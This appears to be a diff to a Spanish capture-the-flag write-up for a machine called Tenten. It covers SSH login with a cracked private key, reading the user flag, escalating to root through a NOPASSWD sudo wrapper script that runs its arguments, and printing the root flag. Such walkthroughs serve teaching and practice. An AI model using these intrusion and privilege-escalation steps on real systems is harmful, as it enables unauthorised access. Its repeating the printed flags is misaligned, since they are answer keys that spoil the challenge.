@@ -273,14 +273,65 @@ Podemos ver que la contraseña que encuentra es **superpassword** así que solo 
 
 Una vez con toda la información en nuestro poder, el usuario Takis y la id_rsa con su contraseña, podemos entrar en la máquina por ssh, ya que tenemos el puerto 22 abierto, de la siguiente manera.
 ```
-ssh -i "id_rsa" Takis@10.10.10.10
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-Permissions 0644 for 'id_rsa' are too open.
-It is required that your private key files are NOT accessible by others.
-This private key will be ignored.
-Load key "id_rsa": bad permissions
-Takis@10.10.10.10's password: superpassword
+ssh -i id_rsa takis@10.10.10.10
+
+
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+65 packages can be updated.
+39 updates are security updates.
+
+
+Last login: Fri May  5 23:05:36 2017
+
+takis@tenten:~$ 
 ```
-## Video
+
+Y ya estamos dentro de la máquina, con el usuario **takis** 
+
+**FLAG USER** 
+```
+takis@tenten:~$ cat user.txt 
+c8afc246f56dcedd58f7ed5c0a24ba6b
+```
+La escalada es muy poco realista, pero se realiza de la siguiente manera...
+
+Si listamos que puede hacer sudo, con un "sudo -l" veremos lo siguiente
+
+```
+takis@tenten:~$ sudo -l
+
+Matching Defaults entries for takis on tenten:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User takis may run the following commands on tenten:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /bin/fuckin
+```
+Tenemos un script que se llama **fuckin**, que es el siguiente
+
+```
+#!/bin/bash
+$1 $2 $3 $4
+```
+Esto nos permite ejecutar cualquier comando como sudo ejecutando este script, ya que lo almacena en sus variables, voy a ejecutar sudo ./fuckin bash y así obtengo ya el root.
+
+```
+sudo ./fuckin bash
+
+root@tenten:/bin# 
+```
+
+**FLAG ROOT** 
+```
+root@tenten:/root# cat root.txt 
+913296a18a362fd8c2c214918df6e572
+```
+
+**Maquina resuelta!!** 
